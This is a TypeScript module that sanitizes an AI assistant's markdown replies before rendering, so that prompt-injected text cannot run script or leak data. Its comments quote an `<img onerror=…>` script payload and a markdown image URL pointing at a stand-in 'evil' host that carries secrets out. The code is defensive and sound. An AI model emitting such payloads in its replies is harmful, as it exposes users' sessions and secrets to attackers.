import { marked } from "marked";
import DOMPurify from "dompurify";

// Claude's replies can repeat text from web pages, files and tool output that an
// attacker wrote (prompt injection). Rendered as raw HTML, a reply containing
// `<img onerror=…>` would run script in your signed-in tab and could send commands
// to your devices. Markdown is converted to HTML, then cleaned to plain formatting.
const PURIFY_CONFIG = {
  USE_PROFILES: { html: true },
  // No fake UI (forms that look like ours) and no inline styling.
  FORBID_TAGS: ["style", "form", "input", "button", "textarea", "select", "option", "dialog"],
  FORBID_ATTR: ["style"],
};

let hooksInstalled = false;

function installHooks(): void {
  if (hooksInstalled) return;
  hooksInstalled = true;
  DOMPurify.addHook("afterSanitizeAttributes", (node) => {
    if (node.tagName === "A" && node.hasAttribute("href")) {
      node.setAttribute("target", "_blank");
      node.setAttribute("rel", "noopener noreferrer nofollow");
    }
    // A remote image URL can carry data out (`![](https://evil/?q=<secret>)`) and
    // loads the moment the reply renders. Show its alt text instead.
    if (node.tagName === "IMG") {
      const src = node.getAttribute("src") || "";
      if (!/^(data:image\/|blob:)/i.test(src)) {
        const alt = node.getAttribute("alt");
        node.replaceWith(document.createTextNode(alt ? `[image: ${alt}]` : "[image]"));
      }
    }
  });
}

function escapeHtml(text: string): string {
  return text.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]!);
}

export function renderMarkdown(text: string): string {
  // Server render (no DOM to sanitize with): plain escaped text only.
  if (!DOMPurify.isSupported) return escapeHtml(text);
  installHooks();
  let html: string;
  try {
    html = marked.parse(text, { async: false }) as string;
  } catch {
    html = escapeHtml(text);
  }
  return DOMPurify.sanitize(html, PURIFY_CONFIG);
}
